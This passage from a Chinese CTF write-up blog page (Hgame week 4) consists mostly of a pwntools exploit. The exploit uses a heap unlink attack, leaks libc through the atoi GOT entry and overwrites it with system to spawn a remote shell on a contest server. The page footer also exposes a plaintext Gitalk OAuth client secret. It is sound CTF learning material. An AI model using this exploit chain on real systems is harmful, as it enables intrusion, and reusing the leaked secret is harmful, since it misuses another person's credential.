+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">dele</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
+
+stdout_addr <span class="token operator">=</span> <span class="token number">0x6020A0</span>
+list_addr <span class="token operator">=</span> <span class="token number">0x6020E0</span>
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./AN2'</span><span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
+    <span class="token comment">#io = process(['./AN2.bak'], env=&#123;'LD_PRELOAD': './libc6_2.23-0ubuntu10_amd64.so'&#125;)</span>
+    <span class="token comment">#io = process(['./AN2.bak'])</span>
+    io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.103.214.163'</span><span class="token punctuation">,</span> <span class="token number">20701</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
+    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
+    add<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># 2</span>
+
+    <span class="token comment"># 伪造chunk</span>
+    payload_1 <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment"># prev_size</span>
+    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x91</span><span class="token punctuation">)</span> <span class="token comment"># size</span>
+    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># fd</span>
+    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
+    payload_1 <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x90</span> <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span>  <span class="token comment"># padding</span>
+    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">)</span>  <span class="token comment">#1的prev_size</span>
+    payload_1 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">)</span>  <span class="token comment">#1的size，并把前一个chunk标记为free(size最低位置为零)</span>
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> payload_1<span class="token punctuation">)</span>
+
+    dele<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 由于unlink，此时list[0] = list - 0x18，list[0]即#0</span>
+
+    edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>stdout_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将list[1]指向stdout处</span>
+
+    pay <span class="token operator">=</span> <span class="token string">'\x40\x55'</span>
+    edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span> <span class="token comment"># 爆破成stderr的值</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
+        ret <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> <span class="token string">'content'</span> <span class="token keyword">in</span> ret<span class="token punctuation">:</span>
+            <span class="token keyword">break</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span>ret<span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span> <span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
+        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">continue</span>
+
+<span class="token comment"># 现在printf都有输出了</span>
+edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x18</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>list_addr <span class="token operator">-</span> <span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 将list[1]指向atoi的got表项</span>
+show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+atoi_addr <span class="token operator">=</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span>
+atoi_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">'atoi_addr='</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>atoi_addr<span class="token punctuation">)</span>
+
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">,</span> atoi_addr<span class="token punctuation">)</span>
+libc_base <span class="token operator">=</span> atoi_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'atoi'</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+
+
+<span class="token keyword">print</span> <span class="token string">'libc_base='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">'system_addr='</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+
+edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># got表上atoi的地址修改成了system的地址</span>
+
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh 1>&amp;2'</span><span class="token punctuation">)</span>  <span class="token comment"># 程序调用了atoi(input)</span>
+
+<span class="token comment">#gdb.attach(io)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这周又学习了新的pwn技术，曾经无比渴望的二进制方向，现在我也可以算是踏出小小一脚入门了，路还长，继续加油！</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>原作者： </strong>feather
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://www.xi4oyu.top/6a7c8d32/" title="Hgame-week4-writeup">http://www.xi4oyu.top/6a7c8d32/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="external nofollow noopener noreferrer" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>欢迎关注我的其它发布渠道</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+        <a target="_blank" class="social-link" href="/atom.xml">
+          <span class="icon">
+            <i class="fa fa-rss"></i>
+          </span>
+
+          <span class="label">RSS</span>
+        </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/e1de0fb/" rel="prev" title="Hgame-week3-writeup">
+                  <i class="fa fa-chevron-left"></i> Hgame-week3-writeup
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/d3ba1d69/" rel="next" title="2020寒假计划的完成度">
+                  2020寒假计划的完成度 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">feather</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">369k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:36</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"featherl","repo":"BlogComment","client_id":"675720f495795eee8627","client_secret":"969c2822176976bcb997f7d6fd07767ce6356043","admin_user":"featherl","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js","integrity":"sha256-Pmj85ojLaPOWwRtlMJwmezB/Qg8BzvJp5eTzvXaYAfA="},"path_md5":"331f0300b0d0380fab3347a0ca6ee153"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
